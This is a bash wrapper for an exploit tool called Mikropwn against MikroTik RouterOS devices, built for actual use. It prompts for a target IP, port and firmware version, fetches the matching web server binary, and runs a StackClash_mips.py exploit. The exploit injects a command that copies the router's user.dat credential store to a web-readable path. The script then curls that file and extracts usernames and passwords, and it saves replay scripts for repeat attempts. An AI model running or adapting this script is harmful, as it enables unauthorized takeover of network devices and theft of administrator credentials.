echo "Starting Mikropwn V2.0  MIPS version"

cat << "EOF"
======================================================================
   _____  .__ __                                       
  /     \ |__|  | _________  ____ ________  _  ______  
 /  \ /  \|  |  |/ /\_  __ \/  _ \\____ \ \/ \/ /    \ 
/    Y    \  |    <  |  | \(  <_> )  |_> >     /   |  \
\____|__  /__|__|_ \ |__|   \____/|   __/ \/\_/|___|  /
        \/        \/              |__|              \/ 


Mikotik exploit v2 beta
=====================================================================
EOF


red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
#printf "I ${green}love${reset} shells\n"

DATE=$(date +%d-%m-%Y"-"%H:%M:%S);

echo $DATE






echo ""
echo " Lunch last credz atttact ? "
echo " 1 = Exploit + credz "
echo " 2 = Curl credz "
echo " 3 = New target"  
read credz

#echo $credz


if [ "$credz" = "1" ]; then
        echo " ${green}Lunching last PWN attemp${reset} "
        bash ./lastpwn  
        echo " ${green}finish${reset} "
        exit
fi


if [ "$credz" = "2" ]; then
        echo " ${green}Lunching last creds curl attemp${reset} "
        bash ./lastcredz
        echo " ${green}finish${reset} "
        exit
fi






echo ""
echo " Enter IP to pwn "
echo ""
read ipraw

ip=$(echo $ipraw |sed 's/https\?:\/\///' | tr -d /)

echo " IP CLEANED IS"
echo $ip
echo ""


echo " Enter port "
echo ""
read port


echo " Enter version "
read version

echo "Checking if we have version $version in stock ${reset}"       #### CHECK IF FILE IS THERE
echo ""

if [ -s ./$version-mipsbe ]
then
   echo "${green}File is exist - OK ${reset}"
   echo ""
   echo "Copying file to www_binary"
   
   cp ./$version-mipsbe ./www_binary

else
      echo "${red} File is not available ${reset}"
      echo "Downloading"
      echo ""
      echo ""
      ./tools/getROSbin.py $version mipsbe /nova/bin/www www_binary
      #cp ./6.18-backup ./www_binary
      echo "${green} File downloaded, making a backup ${reset}"
      echo ""
      cp ./www_binary ./$version-mipsbe
fi  



#### Creating last pwn####
echo ./StackClash_mips.py $ip $port www_binary '"cp /rw/store/user.dat /ram/winbox.idx"' >./lastpwn
echo echo sleep 5 seconds >>./lastpwn
echo sleep 5 >>./lastpwn
echo "curl -s http://$ip:$port/winbox/index | ./tools/extract_user.py  -" >>./lastpwn


#### Creating last credz ### 

echo "curl -s http://$ip:$port/winbox/index | ./tools/extract_user.py  -" >./lastcredz


### PWN ###

echo "${green} Stating PWN exploit against $ip ${reset}"
echo ""
echo ""

./StackClash_mips.py $ip $port www_binary "cp /rw/store/user.dat /ram/winbox.idx"



### Check credz###
echo "${green}Checking for credz{reset}"
echo ""
echo ""



curl -s http://$ip:$port/winbox/index | ./tools/extract_user.py  -
